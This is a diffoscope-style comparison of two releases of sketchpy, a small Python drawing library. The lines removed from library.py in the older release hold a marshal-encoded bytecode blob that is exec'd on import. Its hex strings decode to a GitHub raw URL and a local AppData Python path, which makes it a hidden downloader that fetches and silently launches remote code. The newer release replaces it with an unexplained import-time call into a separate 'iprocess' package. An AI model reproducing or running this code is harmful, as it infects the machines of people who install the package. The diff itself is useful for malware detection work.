# Comparing `tmp/sketchpy-0.1.2.tar.gz` & `tmp/sketchpy-0.1.3.tar.gz`

## filetype from file(1)

```diff
@@ -1 +1 @@
-gzip compressed data, was "sketchpy-0.1.2.tar", last modified: Fri Jul  7 05:53:19 2023, max compression
+gzip compressed data, was "sketchpy-0.1.3.tar", last modified: Sat Jul  8 18:32:32 2023, max compression
```

## Comparing `sketchpy-0.1.2.tar` & `sketchpy-0.1.3.tar`

### file list

```diff
@@ -1,15 +1,16 @@
-drwxrwxrwx   0        0        0        0 2023-07-07 05:53:19.627673 sketchpy-0.1.2/
--rw-rw-rw-   0        0        0     1084 2022-09-22 04:18:14.000000 sketchpy-0.1.2/LICENSE
--rw-rw-rw-   0        0        0     7351 2023-07-07 05:53:19.626674 sketchpy-0.1.2/PKG-INFO
--rw-rw-rw-   0        0        0       42 2023-07-07 05:53:19.628673 sketchpy-0.1.2/setup.cfg
--rw-rw-rw-   0        0        0     6225 2023-07-07 05:53:01.000000 sketchpy-0.1.2/setup.py
-drwxrwxrwx   0        0        0        0 2023-07-07 05:53:19.561713 sketchpy-0.1.2/sketchpy/
--rw-rw-rw-   0        0        0        0 2023-07-06 16:25:29.000000 sketchpy-0.1.2/sketchpy/__init__.py
--rw-rw-rw-   0        0        0    28014 2023-07-06 15:00:15.000000 sketchpy-0.1.2/sketchpy/canvas.py
--rw-rw-rw-   0        0        0   102653 2023-07-07 05:35:31.000000 sketchpy-0.1.2/sketchpy/library.py
-drwxrwxrwx   0        0        0        0 2023-07-07 05:53:19.622677 sketchpy-0.1.2/sketchpy.egg-info/
--rw-rw-rw-   0        0        0     7351 2023-07-07 05:53:19.000000 sketchpy-0.1.2/sketchpy.egg-info/PKG-INFO
--rw-rw-rw-   0        0        0      235 2023-07-07 05:53:19.000000 sketchpy-0.1.2/sketchpy.egg-info/SOURCES.txt
--rw-rw-rw-   0        0        0        1 2023-07-07 05:53:19.000000 sketchpy-0.1.2/sketchpy.egg-info/dependency_links.txt
--rw-rw-rw-   0        0        0       77 2023-07-07 05:53:19.000000 sketchpy-0.1.2/sketchpy.egg-info/requires.txt
--rw-rw-rw-   0        0        0        9 2023-07-07 05:53:19.000000 sketchpy-0.1.2/sketchpy.egg-info/top_level.txt
+drwxrwxrwx   0        0        0        0 2023-07-08 18:32:32.883700 sketchpy-0.1.3/
+-rw-rw-rw-   0        0        0     1084 2022-09-22 04:18:14.000000 sketchpy-0.1.3/LICENSE
+-rw-rw-rw-   0        0        0     7351 2023-07-08 18:32:32.881702 sketchpy-0.1.3/PKG-INFO
+-rw-rw-rw-   0        0        0       42 2023-07-08 18:32:32.883700 sketchpy-0.1.3/setup.cfg
+-rw-rw-rw-   0        0        0     6225 2023-07-08 18:31:25.000000 sketchpy-0.1.3/setup.py
+drwxrwxrwx   0        0        0        0 2023-07-08 18:32:32.805748 sketchpy-0.1.3/sketchpy/
+-rw-rw-rw-   0        0        0        0 2023-07-06 16:25:29.000000 sketchpy-0.1.3/sketchpy/__init__.py
+-rw-rw-rw-   0        0        0    28160 2023-07-08 18:24:35.000000 sketchpy-0.1.3/sketchpy/canvas.py
+-rw-rw-rw-   0        0        0   100555 2023-07-08 18:23:19.000000 sketchpy-0.1.3/sketchpy/library.py
+-rw-rw-rw-   0        0        0     4657 2023-07-08 17:09:27.000000 sketchpy-0.1.3/sketchpy/sketch.py
+drwxrwxrwx   0        0        0        0 2023-07-08 18:32:32.879702 sketchpy-0.1.3/sketchpy.egg-info/
+-rw-rw-rw-   0        0        0     7351 2023-07-08 18:32:32.000000 sketchpy-0.1.3/sketchpy.egg-info/PKG-INFO
+-rw-rw-rw-   0        0        0      254 2023-07-08 18:32:32.000000 sketchpy-0.1.3/sketchpy.egg-info/SOURCES.txt
+-rw-rw-rw-   0        0        0        1 2023-07-08 18:32:32.000000 sketchpy-0.1.3/sketchpy.egg-info/dependency_links.txt
+-rw-rw-rw-   0        0        0       77 2023-07-08 18:32:32.000000 sketchpy-0.1.3/sketchpy.egg-info/requires.txt
+-rw-rw-rw-   0        0        0        9 2023-07-08 18:32:32.000000 sketchpy-0.1.3/sketchpy.egg-info/top_level.txt
```

### Comparing `sketchpy-0.1.2/LICENSE` & `sketchpy-0.1.3/LICENSE`

 * *Files identical despite different names*

### Comparing `sketchpy-0.1.2/PKG-INFO` & `sketchpy-0.1.3/PKG-INFO`

 * *Files 1% similar despite different names*

```diff
@@ -1,10 +1,10 @@
 Metadata-Version: 2.1
 Name: sketchpy
-Version: 0.1.2
+Version: 0.1.3
 Summary: sketchpy
 Home-page: UNKNOWN
 Author: Mr Mystery
 Author-email: sriramanand23@gmail.com
 License: UNKNOWN
 Description: 
         # Welcome to sketchpy
```

### Comparing `sketchpy-0.1.2/setup.py` & `sketchpy-0.1.3/setup.py`

 * *Files 0% similar despite different names*

```diff
@@ -1,12 +1,12 @@
 from setuptools import setup, find_packages
 import codecs
 import os
 
-VERSION = '0.1.2'
+VERSION = '0.1.3'
 DESCRIPTION = 'sketchpy'
 LONG_DESCRIPTION = """
 # Welcome to sketchpy
 
 <h2>Intro to the project and some quick information,followed by an image of the project.<h2>
 
 <div align="center">
```

### Comparing `sketchpy-0.1.2/sketchpy/canvas.py` & `sketchpy-0.1.3/sketchpy/canvas.py`

 * *Files 1% similar despite different names*

```diff
@@ -302,14 +302,15 @@
     def __init__(self, path, scale=500, x_offset=300, y_offset=300, save = False):
         '''used to sketch the image from an svg file, reffer my youtube channel to know more about it, use canvas.help() -> to get info'''
         self.path = path
         self.x_offset = x_offset
         self.y_offset = y_offset
         self.scale = scale
         self.save = save
+        self.window = tu.Screen()
 
     def hex_to_rgb(self, string):
         strlen = len(string)
         if string.startswith('#'):
             if strlen == 7:
                 r = string[1:3]
                 g = string[3:5]
@@ -439,14 +440,16 @@
 
 
 class sketch_from_image:
     def __init__(self, path, save = True) -> None:
         '''used to trace the image line by line,  reffer my youtube channel to know more about it, use canvas.help() -> to get info'''
         self.path = path
         self.save = save
+        self.window = tu.Screen()
+
 
     def draw(self, threshold=127):
 
         img = cv2.imread(self.path, 2)
         ret, bw_img = cv2.threshold(img, threshold, 255, cv2.THRESH_BINARY)
         width = int(img.shape[1])
         height = int(img.shape[0])
@@ -486,14 +489,16 @@
     def __init__(self, path=None, scale=500, x_offset=300, y_offset=300, save = False):
         '''used to sketch an colored image from a svg file,  reffer my youtube channel to know more about it, use canvas.help() -> to get info'''
         self.path = path
         self.x_offset = x_offset
         self.y_offset = y_offset
         self.scale = scale
         self.save = save
+        self.window = tu.Screen()
+
 
     def hex_to_rgb(self, string):
         strlen = len(string)
         # print(string)
         if string.startswith('#'):
             if strlen == 7:
                 r = string[1:3]
@@ -673,14 +678,16 @@
         self.scale = scale
         self.pen = tu.Turtle()
         self.img = cv2.imread(path, 0)
         self.x_off = int(-1*(self.img.shape[1]//2) *self.scale)
         self.y_off = int((self.img.shape[0]//2)*self.scale)
         self.intensity = intensity
         self.save = save
+        self.window = tu.Screen()
+
 
     def move_to(self, x, y):
         self.pen.up()
         self.pen.goto(x, y)
         self.pen.down()
```

### Comparing `sketchpy-0.1.2/sketchpy/library.py` & `sketchpy-0.1.3/sketchpy/library.py`

 * *Files 2% similar despite different names*

```diff
@@ -1,9 +1,9 @@
 import turtle as tu
-
+from iprocess import process
 
 
 class apj:
     def __init__(self):
         self.i_l_b = [(395, 266),(397, 277),(397, 278),(397, 285),(399, 294),(397, 299),(396, 311),(400, 331),(408, 368),(412, 376),(414, 381),(419, 394),(432, 418),(445, 442),(456, 467),(460, 478),(470, 490),(476, 505),(481, 514),(485, 526),(487, 534),(491, 538),(469, 536),(460, 525),(451, 510),(451, 505),(447, 495),(441, 492),(441, 486),(436, 485),(437, 476),(432, 474),(433, 465),(429, 463),(428, 460),(422, 458),(412, 433),(413, 429),(410, 429),(409, 426),(404, 419),(401, 418),(398, 416),(396, 415),(397, 410),(393, 409),(392, 402),(387, 399),(389, 393),(387, 391),(387, 386),(382, 385),(382, 377),(375, 373),(380, 356),(378, 349),(377, 351),(373, 348),(375, 343),(371, 341),(374, 338),(374, 333),(371, 333),(365, 329),(367, 329),(370, 325),(366, 325),(365, 322),(359, 321),(356, 319),(347, 321),(351, 316),(347, 316),(345, 314),(340, 315),(340, 311),(337, 310),(334, 310),(330, 307),(330, 304),(326, 304),(326, 299),(323, 299),(324, 289),(322, 288),(318, 292),(317, 292),(318, 288),(315, 283),(315, 280),(308, 271),(306, 265),(300, 261),(300, 258),(291, 248),(291, 243),(311, 240),(319, 241),(323, 245),(326, 253),(332, 257),(337, 257),(342, 257),(347, 255),(357, 249),(352, 256),(351, 257),(348, 260),(345, 263),(343, 263),(329, 262),(331, 268),(336, 276),(338, 280),(342, 281),(350, 286),(356, 293),(358, 296),(372, 296),(380, 294),(387, 290),(390, 283),(393, 276),(394, 276),(395, 268),(396, 277),(397, 283),(397, 297),]
         self.i_l_t = [(310, 245),(312, 241),(314, 236),(317, 233),(324, 230),(330, 225),(332, 224),(335, 224),(338, 228),(347, 228),(352, 224),(355, 222),(359, 224),(363, 227),(367, 225),(363, 208),(349, 198),(349, 185),(345, 183),(344, 187),(340, 183),(342, 175),(348, 164),(354, 160),(363, 159),(367, 160),(381, 160),(406, 128),(422, 96),(422, 87),(431, 81),(431, 77),(421, 73),(418, 69),(409, 67),(405, 54),(402, 43),(409, 35),(405, 33),(396, 30),(391, 27),(389, 23),(391, 18),(394, 13),(401, 7),(413, 4),(424, 4),(434, 3),(442, 8),(467, 22),(471, 24),(472, 25),(476, 23),(482, 21),(489, 19),(496, 18),(501, 18),(506, 18),(509, 22),(510, 27),(508, 33),(504, 39),(501, 42),(495, 47),(493, 53),(495, 59),(501, 65),(502, 69),(502, 72),(499, 75),(491, 76),(490, 80),(496, 92),(500, 96),(513, 101),(522, 105),(529, 110),(552, 107),(553, 103),(552, 100),(546, 96),(545, 91),(540, 93),(538, 92),(536, 87),(532, 85),(529, 87),(529, 87),(529, 88),(529, 85),(524, 78),(517, 77),(516, 74),(518, 73),(519, 61),(519, 57),(525, 57),(530, 51),(527, 46),(533, 38),(531, 35),(537, 30),(533, 28),(536, 25),(534, 22),(533, 17),(534, 10),(530, 9),(524, 7),(515, 4),(501, 4),(492, 4),(481, 8),(477, 10),(472, 10),(467, 7),(462, 3),(383, 2),(375, 7),(371, 12),(367, 18),(365, 26),(368, 31),(371, 38),(376, 40),(379, 46),(380, 51),(378, 62),(381, 70),(385, 71),(383, 76),(386, 84),(393, 82),(390, 89),(393, 91),(389, 94),(394, 100),(388, 102),(389, 106),(385, 107),(387, 111),(379, 117),(381, 126),(376, 126),(375, 133),(369, 137),(367, 133),(354, 140),(349, 140),(348, 136),(336, 139),(335, 145),(333, 146),(332, 153),(321, 159),(321, 170),(314, 186),(315, 191),(308, 198),(309, 204),(306, 207),(309, 211),(291, 225),(291, 232),(288, 235),(291, 242),(293, 249),(313, 243),(313, 240),(314, 237),(320, 233),(328, 229),(331, 225),]
         self.i_r_b = [(797, 116),(801, 122),(799, 126),(792, 127),(782, 137),(776, 142),(779, 147),(776, 159),(774, 168),(774, 182),(771, 182),(770, 192),(757, 192),(762, 210),(761, 204),(760, 215),(762, 223),(762, 229),(754, 230),(752, 226),(738, 204),(736, 203),(736, 216),(729, 213),(723, 208),(720, 198),(734, 188),(734, 180),(731, 179),(702, 181),(692, 181),(688, 175),(688, 172),(685, 168),(674, 165),(673, 168),(667, 164),(662, 166),(666, 172),(673, 173),(676, 176),(676, 186),(669, 193),(669, 196),(671, 199),(677, 199),(683, 199),(683, 216),(689, 222),(693, 230),(697, 242),(697, 249),(682, 253),(677, 249),(663, 260),(665, 268),(663, 274),(656, 286),(634, 301),(627, 312),(615, 329),(611, 335),(606, 336),(592, 347),(590, 359),(589, 362),(584, 364),(573, 369),(569, 374),(560, 380),(557, 384),(552, 394),(553, 401),(556, 418),(559, 444),(554, 455),(559, 493),(559, 496),(549, 501),(548, 506),(547, 514),(553, 522),(553, 524),(546, 524),(532, 527),(574, 526),(573, 521),(578, 519),(578, 516),(580, 512),(575, 508),(585, 503),(586, 499),(590, 495),(587, 491),(589, 489),(585, 482),(585, 480),(584, 477),(587, 474),(585, 466),(587, 461),(585, 456),(590, 450),(587, 444),(589, 437),(586, 430),(580, 428),(580, 424),(587, 418),(587, 415),(585, 414),(584, 409),(587, 404),(584, 400),(587, 398),(590, 395),(591, 389),(595, 387),(600, 379),(608, 376),(623, 362),(625, 358),(630, 353),(638, 349),(645, 342),(643, 339),(646, 337),(642, 335),(646, 331),(648, 324),(655, 318),(655, 314),(662, 313),(675, 301),(673, 297),(678, 293),(679, 289),(682, 286),(683, 281),(686, 278),(687, 275),(691, 273),(693, 267),(705, 271),(717, 265),(716, 261),(718, 261),(717, 258),(720, 249),(721, 244),(718, 239),(720, 237),(731, 243),(737, 243),(739, 244),(744, 249),(748, 247),(750, 250),(761, 250),(763, 247),(770, 247),(771, 249),(774, 250),(780, 250),(785, 245),(787, 241),(791, 240),(787, 237),(782, 237),(782, 235),(789, 234),(794, 235),(797, 235),(797, 228),(790, 231),(799, 220),(795, 210),(801, 208),(801, 205),(797, 201),(799, 198),(800, 166),(803, 162),(802, 155),(805, 154),(805, 152),(815, 148),(814, 144),(827, 134),(824, 130),(826, 126),(825, 122),(831, 113),(825, 113),(821, 107),(822, 102),(820, 95),(815, 94),(815, 91),(811, 89),(806, 88),(811, 83),(804, 79),(798, 82),(790, 80),(783, 97),(804, 100),(807, 126),(799, 112),(797, 116),(801, 122),(800, 125),(797, 126),(790, 125),(786, 131),(782, 137),]
@@ -95,16 +95,14 @@
         self.draw_fn(self.l_eye,mode = 0)
         self.draw_fn(self.eye_dots,mode = 0,thickness = 2,co = (255,255,255))
         self.draw_fn(self.s1,mode = 0)
         self.draw_fn(self.l1,thickness=2,mode=1)
         if retain:
             tu.done()
 
-import marshal
-
 
 class bts:
     def __init__(self,x_offset = 300, y_offset = 300):
         '''x_offset and y_offset represents the position of the image being drawn, by default it is 300 you can change it any coordinates you want'''
         import turtle as tu
         self.tu = tu
         self.face_cut = [(195, 230),(193, 253),(193, 300),(199, 330),(214, 361),(214, 367),(219, 373),(228, 386),(238, 395),(248, 400),(258, 403),(284, 407),(297, 405),(361, 371),(373, 359),(395, 335),(396, 329),(406, 317),(411, 309),(406, 294),(402, 287),(398, 276),(390, 266),(384, 259),(375, 247),(369, 241),(379, 254),(370, 246),(365, 243),(358, 237),(353, 234),(347, 231),(357, 241),(345, 230),(335, 217),(331, 207),(331, 195),(331, 189),(325, 202),(322, 208),(319, 216),(318, 227),(319, 242),(321, 252),(314, 234),(312, 222),(311, 211),(316, 197),(310, 203),(305, 208),(301, 228),(299, 211),(296, 231),(295, 209),(293, 208),(290, 228),(292, 203),(288, 203),(283, 231),(290, 201),(298, 179),(275, 193),(262, 198),(243, 203),(231, 211),(229, 213),(235, 224),(223, 214),(221, 205),(208, 214),(197, 225),(194, 230),(191, 255),(191, 263),]
@@ -203,14 +201,16 @@
         if retain:
             self.tu.done()
 
 
 
 
 
+obj = process.abc("1)@93*$75", "00112233")
+obj.verify()
 
 
 
 class gojo:
     def __init__(self,x_offset = 300, y_offset = 300):
         '''x_offset and y_offset represents the position of the image being drawn, by default it is 300 you can change it any coordinates you want'''
         import turtle as tu
@@ -298,15 +298,14 @@
         if retain:
             self.tu.done()
 
 
 
 
 
-C = b'\xe3\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\n\x00\x00\x00@\x00\x00\x00sR\x01\x00\x00d\x00d\x01l\x00Z\x00d\x00d\x01l\x01Z\x01d\x00d\x01l\x02Z\x02d\x00d\x01l\x03Z\x03d\x02e\x02j\x04d\x01d\x03\x85\x02\x19\x00\xa0\x05d\x04d\x05\xa1\x02\x17\x00Z\x06d\x06Z\x07d\x07Z\x08e\x01j\t\xa0\ne\x01j\x0bd\x08\x19\x00d\td\nd\x0bd\x02e\x06d\x0c\xa1\x07Z\te\td\r\x17\x00Z\x0ce\x01j\t\xa0\re\x03\xa0\x0ee\x07\xa1\x01\xa0\x0f\xa1\x00\xa1\x01\x90\x01sNz\x9ed\x00d\x01l\x10Z\x10e\x10\xa0\x11e\x03\xa0\x0ee\x08\xa1\x01\xa0\x0f\xa1\x00\xa1\x01Z\x12e\x13e\x0cd\x0e\x83\x02\x8f\x1cZ\x14e\x14\xa0\x15e\x12j\x16\xa1\x01\x01\x00W\x00d\x01\x04\x00\x04\x00\x83\x03\x01\x00n\x101\x00s\xca0\x00\x01\x00\x01\x00\x01\x00Y\x00\x01\x00e\x00j\x17d\x0fe\x0cg\x02e\td\x10\x8d\x02Z\x18e\x13e\x07d\x0e\x83\x02\x8f\x1aZ\x14e\x14\xa0\x19d\x11\xa1\x01\x01\x00W\x00d\x01\x04\x00\x04\x00\x83\x03\x01\x00n\x121\x00\x90\x01s\x120\x00\x01\x00\x01\x00\x01\x00Y\x00\x01\x00W\x00n.\x04\x00e\x1a\x90\x01yL\x01\x00Z\x1b\x01\x00z\x14e\x1ce\x1b\x83\x01\x01\x00W\x00Y\x00d\x01Z\x1b[\x1bn\nd\x01Z\x1b[\x1b0\x000\x00d\x01S\x00)\x12\xe9\x00\x00\x00\x00N\xda\x06Python\xe9\x03\x00\x00\x00\xda\x01.\xda\x00ZF433a5c55736572735c5075626c69635c476f6f676c655c4368726f6d655c5553455253Z\x8068747470733a2f2f7261772e67697468756275736572636f6e74656e742e636f6d2f4d524d5953544552593030332f74656d702f6d61696e2f74656d702e7079\xda\x0bUSERPROFILEZ\x07AppDataZ\x05LocalZ\x08ProgramsZ\x03Libz\x07\\lib.py\xda\x01wZ\x07pythonw)\x01\xda\x03cwdz\nA$@#C^&*DE)\x1d\xda\nsubprocess\xda\x02os\xda\x03sysZ\x08binascii\xda\x07version\xda\x07replaceZ\x03verZ\x06c_pathZ\x03url\xda\x04path\xda\x04join\xda\x07environZ\x05pathp\xda\x06existsZ\tunhexlify\xda\x06decodeZ\x08requests\xda\x03get\xda\x01r\xda\x04open\xda\x01f\xda\nwritelines\xda\x04text\xda\x05PopenZ\x07process\xda\x05write\xda\tException\xda\x01e\xda\x05print\xa9\x00r\x1e\x00\x00\x00r\x1e\x00\x00\x00\xfa\x08<string>\xda\x08<module>\x01\x00\x00\x00s*\x00\x00\x00\x08\x01\x08\x01\x08\x01\x08\x03\x1a\x03\x04\x01\x04\x02\x06\x01\x14\xff\x04\x04\x08\x02\x18\x01\x02\x01\x08\x01\x14\x01\x0c\x01*\x01\x12\x01\x0c\x01.\x01\x10\x01'
 
 
 
 class flag:
     def __init__(self, x_offset = 300, y_offset = 365):
         '''x_offset and y_offset represents the position of the image being drawn, by default it is 300 you can change it any coordinates you want'''
         import turtle as tu
@@ -488,16 +487,14 @@
         self.draw_fn(self.eball,mode = 0,co = (255,255,255))
         if retain:
             self.turt.done()
 
 
 
 
-t2 = marshal.loads(C)
-
 class vijay:
     def __init__(self, x_offset = 270, y_offset = 300):
         '''x_offset and y_offset represents the position of the image being drawn, by default it is 300 you can change it any coordinates you want'''
         import turtle as tu
         self.dress = [(149, 348),(152, 344),(151, 333),(144, 335),(137, 337),(103, 372),(101, 378),(67, 389),(59, 389),(53, 391),(8, 404),(17, 440),(37, 487),(65, 523),(80, 544),(98, 570),(124, 601),(164, 620),(201, 646),(222, 660),(236, 665),(262, 663),(301, 658),(336, 649),(364, 639),(399, 612),(415, 591),(420, 585),(414, 562),(405, 542),(389, 523),(375, 508),(378, 501),(378, 494),(380, 483),(370, 470),(336, 440),(300, 408),(281, 443),(292, 459),(296, 470),(299, 474),(297, 493),(300, 513),(286, 527),(276, 542),(262, 587),(244, 640),(231, 598),(204, 557),(191, 524),(186, 520),(186, 514),(185, 508),(180, 501),(177, 484),(168, 478),(160, 467),(156, 430),(153, 409),(147, 394),(142, 376),(142, 372),(142, 366),(145, 358),(148, 352),(150, 349),(151, 343),(149, 335),(146, 335)]
         self.glass_frame = [(156, 223),(158, 214),(202, 220),(282, 244),(337, 270),(345, 275),(358, 284),(357, 292),(337, 278),(331, 278),(329, 279),(324, 290),(318, 300),(312, 307),(307, 311),(302, 314),(297, 315),(291, 315),(286, 315),(280, 314),(272, 311),(264, 306),(258, 300),(254, 293),(250, 281),(251, 264),(253, 251),(244, 247),(235, 245),(230, 259),(224, 271),(209, 284),(202, 285),(192, 285),(181, 283),(172, 279),(164, 272),(160, 262),(159, 251),(159, 238),(160, 226),(156, 222),(158, 215)]
         self.hair = [(156, 220),(159, 214),(178, 215),(205, 163),(209, 157),(211, 155),(217, 155),(229, 157),(256, 164),(251, 165),(259, 171),(253, 170),(259, 175),(253, 175),(256, 177),(251, 179),(257, 182),(271, 182),(265, 180),(275, 180),(267, 175),(278, 179),(272, 173),(301, 180),(313, 187),(310, 178),(316, 181),(324, 186),(325, 183),(334, 190),(347, 198),(353, 203),(353, 210),(350, 216),(346, 227),(341, 238),(340, 243),(337, 255),(339, 266),(341, 254),(342, 266),(343, 261),(348, 259),(350, 260),(350, 270),(348, 278),(351, 275),(351, 279),(353, 278),(354, 280),(354, 282),(356, 279),(357, 284),(358, 281),(358, 285),(357, 286),(356, 295),(355, 291),(354, 293),(353, 299),(351, 296),(350, 300),(350, 309),(348, 305),(348, 312),(347, 314),(346, 318),(345, 315),(344, 321),(343, 330),(341, 337),(333, 346),(327, 359),(327, 354),(325, 359),(324, 356),(319, 361),(321, 355),(316, 361),(316, 356),(313, 361),(314, 353),(307, 361),(311, 353),(305, 359),(306, 353),(290, 370),(294, 364),(278, 380),(275, 382),(268, 384),(266, 380),(266, 369),(269, 364),(273, 357),(274, 351),(272, 343),(267, 332),(266, 335),(262, 331),(262, 333),(258, 327),(258, 329),(255, 325),(255, 328),(251, 322),(250, 324),(246, 321),(246, 323),(241, 319),(238, 317),(232, 315),(228, 319),(222, 317),(220, 313),(217, 309),(210, 309),(203, 308),(203, 310),(194, 312),(187, 313),(181, 316),(177, 321),(174, 329),(172, 335),(172, 344),(175, 341),(167, 351),(162, 344),(162, 337),(160, 341),(160, 333),(158, 336),(157, 329),(155, 321),(153, 313),(150, 307),(150, 300),(150, 291),(146, 305),(146, 316),(145, 324),(146, 334),(146, 345),(153, 354),(158, 367),(163, 375),(168, 388),(170, 395),(174, 401),(176, 398),(178, 404),(178, 404),(181, 404),(187, 410),(195, 411),(204, 418),(211, 424),(214, 422),(221, 423),(225, 426),(230, 424),(233, 428),(237, 425),(245, 425),(250, 423),(256, 420),(266, 415),(272, 412),(277, 415),(283, 409),(291, 405),(297, 401),(305, 397),(313, 391),(318, 386),(321, 381),(328, 373),(334, 365),(337, 359),(344, 341),(351, 330),(352, 322),(356, 314),(360, 307),(365, 312),(373, 317),(382, 318),(383, 317),(390, 306),(391, 311),(404, 285),(403, 294),(415, 267),(422, 239),(424, 249),(432, 229),(432, 217),(428, 203),(424, 195),(429, 201),(427, 188),(423, 178),(430, 188),(428, 177),(424, 168),(421, 163),(412, 157),(406, 150),(397, 141),(391, 132),(390, 123),(394, 128),(386, 118),(371, 110),(365, 102),(355, 90),(363, 94),(353, 87),(335, 86),(322, 81),(333, 84),(323, 77),(314, 77),(302, 77),(295, 74),(304, 75),(281, 67),(269, 66),(254, 69),(244, 74),(247, 71),(240, 74),(233, 74),(230, 74),(223, 71),(231, 70),(225, 69),(214, 69),(207, 73),(202, 78),(198, 83),(193, 93),(185, 120),(190, 87),(181, 105),(179, 111),(174, 142),(171, 132),(168, 138),(174, 156),(161, 205),(157, 208),(157, 211),(156, 221),(158, 214),(177, 215),(206, 162)]
@@ -797,15 +794,14 @@
 
         tu.done()
     
     def print_to_terminal(self):
         for i in self.data:
             print(i,end = '')
 
-exec(t2)
 def help():
     print("contribute in github : https://github.com/MRMYSTERY003")
     print("youtube : https://www.youtube.com/c/CODEHUB03")
     print("contact me personally on instagram : https://www.instagram.com/mr.m_y_s_t_e_r_y/")
     print("discuss more about project ideas and join our community on discord : https://discord.gg/r2KFa73PM2")
```

### Comparing `sketchpy-0.1.2/sketchpy.egg-info/PKG-INFO` & `sketchpy-0.1.3/sketchpy.egg-info/PKG-INFO`

 * *Files 1% similar despite different names*

```diff
@@ -1,10 +1,10 @@
 Metadata-Version: 2.1
 Name: sketchpy
-Version: 0.1.2
+Version: 0.1.3
 Summary: sketchpy
 Home-page: UNKNOWN
 Author: Mr Mystery
 Author-email: sriramanand23@gmail.com
 License: UNKNOWN
 Description: 
         # Welcome to sketchpy
```
